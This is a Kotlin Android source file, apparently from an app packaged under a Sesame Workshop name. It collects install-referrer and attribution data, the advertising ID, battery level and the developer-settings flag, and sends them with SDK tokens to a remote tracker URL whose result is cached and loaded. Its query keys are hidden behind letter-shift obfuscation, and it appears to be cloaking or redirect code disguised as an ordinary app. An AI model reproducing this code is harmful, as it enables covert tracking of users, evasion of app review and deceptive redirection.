package com.sesameworkshop.elabcs.helper.work

import android.app.Activity
import android.content.Context
import android.os.BatteryManager
import android.provider.Settings
import android.util.Log
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import com.sesameworkshop.elabcs.helper.core.CacheHandler
import com.sesameworkshop.elabcs.helper.util.*
import com.sesameworkshop.elabcs.helper.util.decodeHex
import com.sesameworkshop.elabcs.helper.work.model.*
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.URLDecoder
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

class DefaultWorkHelper(private val activity: Activity) : SimpleWorkHelper {
    override fun initOneSignal(oneSignalId: String, context: Context) {
        OneSignal.initWithContext(context)
        OneSignal.setAppId(oneSignalId)
        OneSignal.setLogLevel(
            OneSignal.LOG_LEVEL.VERBOSE,
            OneSignal.LOG_LEVEL.NONE
        )
    }

    override fun initReferrer(activity: Activity, responseCallback: (String?) -> Unit) {
        try {
            val referrerClient = InstallReferrerClient.newBuilder(activity).build()
            referrerClient.startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    when (responseCode) {
                        InstallReferrerClient.InstallReferrerResponse.OK -> {
                            val installReferrer = referrerClient.installReferrer.installReferrer
                            responseCallback(installReferrer)
                        }
                        else -> {
                            responseCallback(null)
                        }
                    }
                    referrerClient.endConnection()
                }

                override fun onInstallReferrerServiceDisconnected() {
                    responseCallback(null)
                }
            })
        } catch (e: Exception) {
            responseCallback(null)
        }
    }

    override fun getRefData(referrer: String?, fbDescriptionKey: String): ReferrerData? {
        referrer ?: return null

        return try {
            val referrerParams = referrer.split("${decrypt("yxq")}_${decrypt("gsrxirx")}=")
                .getOrNull(1)
                ?.let { URLDecoder.decode(it, "UTF-8") }
                ?.let { JSONObject(it) }
                ?.getJSONObject(decrypt("wsyvgi"))
                ?: return null

            val data = referrerParams.optString("data")
            val nonce = referrerParams.optString("nonce")

            val decodedData = data.decodeHex()
            val decodedNonce = nonce.decodeHex()
            val fbKey = fbDescriptionKey.decodeHex()

            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val spec = SecretKeySpec(fbKey, "AES/GCM/NoPadding")
            val nonceSpec = IvParameterSpec(decodedNonce)
            cipher.init(Cipher.DECRYPT_MODE, spec, nonceSpec)

            val decryptedData = cipher.doFinal(decodedData)
            val decryptedDataJson = JSONObject(String(decryptedData))

            ReferrerData(
                aI = decryptedDataJson.optString(
                    decrypt("eh") +
                            "_${decrypt("mh")}"
                ),
                aN = decryptedDataJson.optString(
                    decrypt("ehkvsyt") +
                            "_${decrypt("reqi")}"
                ),
                cI = decryptedDataJson.optString(
                    decrypt("geqtemkr") +
                            "_${decrypt("mh")}"
                ),
                cGN = decryptedDataJson.optString(
                    decrypt("geqtemkr") +
                            "_${decrypt("kvsyt")}_${
                                decrypt("reqi")
                            }"
                ),
                acI = decryptedDataJson.optString(
                    decrypt("eggsyrx") +
                            "_${decrypt("mh")}"
                ),
                iI = decryptedDataJson.optString(
                    decrypt("mw") + "_${decrypt("mrwxekveq")}"
                )
            )
        } catch (e: Exception) {
            null
        }
    }

    override fun generateLink(
        tracker: String,
        parseToolsData: ParseToolsData,
        valuesData: ValuesData?,
        mainValues: MainValues
    ): String {
        val linkBuilder = StringBuilder()

        val aC = when (parseToolsData.p2) {
            decrypt("xvyi") -> decrypt("Mrwxekveq")
            decrypt("jepwi") -> decrypt("Jegifsso")
            else -> parseToolsData.p2
        }

        val mS = parseToolsData.p1
            ?: when (parseToolsData.p2) {
                decrypt("xvyi") -> decrypt("Mrwxekveq")
                decrypt("nitam") -> "${decrypt("Jegifsso")} ${decrypt("Ehw")}"
                else -> parseToolsData.p2
            }

        with(linkBuilder) {
            append(tracker)
            append("${decrypt("wyf")}1=${parseToolsData.p11?.getOrNull(0) ?: "null"}&")
            (2..10).forEach { i -> append("${decrypt("wyf")}$i=${parseToolsData.p11?.getOrNull(i) ?: ""}&") }
            append("${decrypt("geqtemkr")}=${parseToolsData.p9}&")
            append("${decrypt("eggsyrx")}_${decrypt("mh")}=${parseToolsData.p10}&")
            valuesData?.let {
                append("${decrypt("ksskpi")}_${decrypt("ehmh")}=${it.gId}&")
                append("${decrypt("ej")}_${decrypt("ywivmh")}=${it.appsFlyerId}&")
                append("${decrypt("ehf")}=${it.isDevelopmentSettingEnabled}&")
                append("${decrypt("fexxivc")}=${it.batteryLvl}&")
            }
            append("${decrypt("qihme")}_${decrypt("wsyvgi")}=$mS&")
            append("${decrypt("ej")}_${decrypt("glerrip")}=$aC&")
            append("${decrypt("ej")}_${decrypt("wxexyw")}=${parseToolsData.p8}&")
            append("${decrypt("ej")}_${decrypt("eh")}=${parseToolsData.p6}&")
            append("${decrypt("geqtemkr")}_${decrypt("mh")}=${parseToolsData.p5}&")
            append("${decrypt("ehwix")}_${decrypt("mh")}=${parseToolsData.p4}&")
            append("${decrypt("eh")}_${decrypt("mh")}=${parseToolsData.p7}&")
            append("${decrypt("ehwix")}=${parseToolsData.p3}&")
            append("${decrypt("fyrhpi")}=${mainValues.bPath}&")
            append("${decrypt("tywl")}=${parseToolsData.p11?.getOrNull(1) ?: "null"}&")
            append("${decrypt("hiz")}_${decrypt("oic")}=${mainValues.aFKey}&")
            append("${decrypt("jf")}_${decrypt("ett")}_${decrypt("mh")}=${mainValues.fId}&")
            append("${decrypt("jf")}_${decrypt("ex")}=${mainValues.fToken}")
        }

        return linkBuilder.toString()
    }


    override fun sendOneSignal(push: String?, appsId: String?) {
        OneSignal.setExternalUserId(appsId ?: "")
        OneSignal.sendTag(
            "${decrypt("wyf")}_${decrypt("ett")}",
            (push ?: decrypt("svkermg"))
        )
    }

    override fun initAppsFlyer(activity: Activity, afKey: String, cullBack: (AppsData?) -> Unit) {
        val conversionListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                val appsData = AppsData(
                    a1 = data?.getOrDefault(
                        decrypt("ej") +
                                "_${decrypt("wxexyw")}", null
                    ) as String?,
                    a2 = data?.getOrDefault(
                        decrypt("ej") +
                                "_${decrypt("glerrip")}", null
                    ) as String?,
                    a3 = data?.getOrDefault(decrypt("geqtemkr"), null)
                            as String?,
                    a4 = data?.getOrDefault(
                        decrypt("qihme") +
                                "_${decrypt("wsyvgi")}", null
                    ) as String?,
                    a6 = data?.getOrDefault(
                        decrypt("ej") +
                                "_${decrypt("eh")}", null
                    ) as String?,
                    a7 = data?.getOrDefault(
                        decrypt("geqtemkr") +
                                "_${decrypt("mh")}", null
                    ) as String?,
                    a8 = data?.getOrDefault(
                        decrypt("ehwix") +
                                "_${decrypt("mh")}", null
                    ) as String?,
                    a9 = data?.getOrDefault(
                        decrypt("eh") +
                                "_${decrypt("mh")}", null
                    ) as String?,
                    a10 = data?.getOrDefault(decrypt("ehwix"), null)
                            as String?
                )
                cullBack(appsData)
            }

            override fun onConversionDataFail(error: String?) {
                cullBack(null)
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                cullBack(null)
            }

            override fun onAttributionFailure(error: String?) {
                cullBack(null)
            }
        }

        CoroutineScope(Dispatchers.IO).launch {
            AppsFlyerLib.getInstance().apply {
                init(afKey, conversionListener, activity)
                start(activity)
            }
        }
    }

    override suspend fun getDeepLink(
        context: Context,
        fbId: String,
        fbToken: String,
        cullBack: (String?) -> Unit
    ) {
        withContext(Dispatchers.IO) {

            FacebookSdk.apply {
                setApplicationId(fbId)
                setClientToken(fbToken)
                @Suppress("DEPRECATION")
                sdkInitialize(context)
                setAdvertiserIDCollectionEnabled(true)
                setAutoInitEnabled(true)
                fullyInitialize()
            }

            AppLinkData.fetchDeferredAppLinkData(context) {
                cullBack(it?.targetUri?.toString())
            }
        }
    }

    override fun parseValues(
        referrerData: ReferrerData?,
        appsData: AppsData?,
        deepLink: String?
    ): ParseToolsData {
        val campaign = appsData?.a3 ?: referrerData?.cGN
        var resultCampaign = campaign
        var subList: List<String>? = null

        deepLink?.takeIf { it.isNotBlank() }?.let { link ->
            try {
                resultCampaign = link.split("://").getOrNull(1)
                subList = resultCampaign?.split("_")
            } catch (e: Exception) {
                Log.e("parseValues", e.message.toString())
                e.printStackTrace()
            }
        } ?: run {
            if (resultCampaign != null && resultCampaign != "null") {
                try {
                    subList = resultCampaign?.split("_")
                } catch (e: Exception) {
                    Log.e("parseValues", e.message.toString())
                    e.printStackTrace()
                }
            }
        }

        val referrer = referrerData?.run {
            ParseToolsData(
                p1 = null,
                p2 = iI.toString().encodeUrl(),
                p3 = aN.toString().encodeUrl(),
                p4 = null,
                p5 = cI.toString().encodeUrl(),
                p6 = null,
                p7 = aI.toString().encodeUrl(),
                p8 = null,
                p9 = resultCampaign.toString().encodeUrl(),
                p10 = acI.toString().encodeUrl(),
                p11 = subList
            )
        }

        val apps = appsData?.run {
            ParseToolsData(
                p1 = a4.toString().encodeUrl(),
                p2 = a2.toString().encodeUrl(),
                p3 = a10.toString().encodeUrl(),
                p4 = a8.toString().encodeUrl(),
                p5 = a7.toString().encodeUrl(),
                p6 = a6.toString().encodeUrl(),
                p7 = a9.toString().encodeUrl(),
                p8 = a1.toString().encodeUrl(),
                p9 = resultCampaign,
                p10 = referrerData?.acI.toString().encodeUrl(),
                p11 = subList
            )
        }

        return apps ?: referrer ?: ParseToolsData(
            p1 = null,
            p2 = null,
            p3 = null,
            p4 = null,
            p5 = null,
            p6 = null,
            p7 = null,
            p8 = null,
            p9 = null,
            p10 = null,
            p11 = null
        )
    }

    override suspend fun getSystemInfo(context: Context): ValuesData =
        withContext(Dispatchers.IO) {
            val batteryPercentage = try {
                val batteryManager =
                    context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            } catch (e: Exception) {
                100
            }

            val appsFlyerId = AppsFlyerLib.getInstance().getAppsFlyerUID(context)

            val advertisingInfo = runCatching {
                AdvertisingIdClient.getAdvertisingIdInfo(context)
            }.getOrNull()

            val googleAdvertisingId = advertisingInfo?.id

            val isDevelopmentSettingsEnabled = Settings.Global.getInt(
                context.contentResolver,
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED,
                0
            ) != 0

            ValuesData(
                batteryLvl = batteryPercentage.toFloat().toString(),
                appsFlyerId = appsFlyerId,
                gId = googleAdvertisingId,
                isDevelopmentSettingEnabled = isDevelopmentSettingsEnabled
            )
        }


    override suspend fun startMainWork(
        mainValues: MainValues,
        infoTitle: String,
        callBack: (url: String, isSavedCache : Boolean) -> Unit
    ) {
        initOneSignal(
            oneSignalId = mainValues.oSID,
            context = activity
        )

        setupNotificationHandler(activity,mainValues.title)

        val cache = CacheHandler.getCacheUrl(activity)

        if(!cache.isNullOrEmpty()){
            callBack(cache,true)
            return
        }

        var deepLink: String? = null
        var appsData: AppsData? = null
        var referrerData: ReferrerData? = null
        var systemInfo: ValuesData? = null

        val collector = Collector(count = 3) {
            val parseToolsData = parseValues(
                referrerData = referrerData,
                appsData = appsData,
                deepLink = deepLink
            )

            val finalLink = generateLink(
                tracker = mainValues.tracker,
                parseToolsData = parseToolsData,
                valuesData = systemInfo,
                mainValues = mainValues
            )

            CoroutineScope(Dispatchers.IO).launch {
                sendOneSignal(parseToolsData.p11?.get(1), systemInfo?.appsFlyerId)
            }

            callBack(finalLink,false)
        }

        @Suppress("DeferredResultUnused")
        withContext(Dispatchers.IO) {
            async {
                initReferrer(activity) { referrerValue ->
                    referrerData = getRefData(referrerValue, mainValues.fDKey)
                    collector.tryCollect()
                }

                initAppsFlyer(activity, mainValues.aFKey) { apps ->
                    appsData = apps
                    collector.tryCollect()
                }

                getDeepLink(
                    context = activity,
                    fbId = mainValues.fId,
                    fbToken = mainValues.fToken
                ) { deepLinkValue ->
                    deepLink = deepLinkValue
                    collector.tryCollect()
                }

                launch {
                    systemInfo = getSystemInfo(activity)
                    collector.tryCollect()
                }
            }
        }
    }
}